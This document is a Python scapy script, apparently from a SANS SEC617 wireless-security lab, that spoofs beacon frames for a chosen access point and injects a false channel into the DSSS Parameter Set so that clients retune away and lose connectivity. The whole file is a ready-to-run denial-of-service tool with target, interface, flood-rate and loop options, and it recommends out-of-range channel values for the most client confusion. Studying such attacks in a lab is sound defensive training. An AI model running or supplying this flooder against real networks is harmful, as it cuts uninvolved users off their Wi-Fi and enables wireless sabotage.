#!/usr/bin/env python3
"""
Beacon DS-Parameter-Set DoS.

Spoofs beacon frames for a target SSID/BSSID while advertising a *different*
channel in the DSSS Parameter Set IE (element ID 3). Stations that trust the
announced channel will retune away from their real AP and lose connectivity
until they re-scan and re-associate.

Run on a monitor-mode interface tuned to the AP's *real* channel. The value
passed with -c/--channel is the *lie* injected into the DSSS Parameter Set.

Authorized SANS SEC617 lab use only.
"""

import argparse

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp


# RSN IE describing WPA2-PSK with CCMP+TKIP pairwise and TKIP group. Kept
# verbatim from the original lab so a spoofed beacon for a "privacy" network
# still parses cleanly on the client side.
RSN_INFO = (
    b"\x01\x00"          # RSN version 1
    b"\x00\x0f\xac\x02"  # Group cipher suite: TKIP
    b"\x02\x00"          # Pairwise cipher count = 2
    b"\x00\x0f\xac\x04"  # Pairwise: CCMP/AES
    b"\x00\x0f\xac\x02"  # Pairwise: TKIP
    b"\x01\x00"          # AKM count = 1
    b"\x00\x0f\xac\x02"  # AKM: PSK
    b"\x00\x00"          # RSN capabilities
)


def build_beacon(bssid: str, ssid, channel: int, privacy: bool) -> RadioTap:
    cap = "ESS+privacy" if privacy else "ESS"
    ssid_bytes = ssid if isinstance(ssid, (bytes, bytearray)) else ssid.encode()

    dot11 = Dot11(
        type=0, subtype=8,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid,
        addr3=bssid,
    )
    beacon = Dot11Beacon(cap=cap)
    essid = Dot11Elt(ID="SSID", info=ssid_bytes, len=len(ssid_bytes))
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")  # 1,2,5.5,11 Mbps (basic)
    dsset = Dot11Elt(ID="DSset", info=bytes([channel]), len=1)

    frame = RadioTap() / dot11 / beacon / essid / rates / dsset
    if privacy:
        frame = frame / Dot11Elt(ID="RSNinfo", info=RSN_INFO)
    return frame


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-a", "--ap", required=True, help="Target AP MAC (BSSID)")
    p.add_argument("-s", "--ssid", required=True, help="Target AP SSID")
    p.add_argument("-i", "--interface", required=True,
                   help="Monitor-mode interface (tuned to the AP's real channel)")
    p.add_argument("-c", "--channel", required=True, type=int,
                   help="Spoofed channel value injected into the DSSS Parameter "
                        "Set (1-255). Values >14 are out of standard range and "
                        "particularly effective at confusing clients -- the "
                        "SEC617 reference example uses 238.")
    p.add_argument("--no-privacy", action="store_true",
                   help="Drop the privacy bit and the RSN IE (advertise an open network)")
    p.add_argument("--interval", type=float, default=0.1,
                   help="Inter-frame interval in seconds (default 0.1, ~10/sec)")
    p.add_argument("--count", type=int, default=0,
                   help="Number of beacons to send (0 = run until Ctrl-C)")
    p.add_argument("-y", "--yes", action="store_true",
                   help="Skip the interactive 'press enter' prompt")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    if not 1 <= args.channel <= 255:
        raise SystemExit(f"channel {args.channel} does not fit in a single byte (1-255)")
    if args.channel > 14:
        print(f"[!] channel {args.channel} is outside the standard 1-14 range "
              f"-- intentional for max client confusion (SEC617 example uses 238).")

    packet = build_beacon(args.ap, args.ssid, args.channel, privacy=not args.no_privacy)
    packet.show()

    if not args.yes:
        input(f"\nPress Enter to flood beacons on {args.interface} (Ctrl-C to stop)...")

    try:
        if args.count > 0:
            sendp(packet, iface=args.interface, inter=args.interval,
                  count=args.count, verbose=False)
        else:
            sendp(packet, iface=args.interface, inter=args.interval,
                  loop=1, verbose=False)
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == "__main__":
    main()
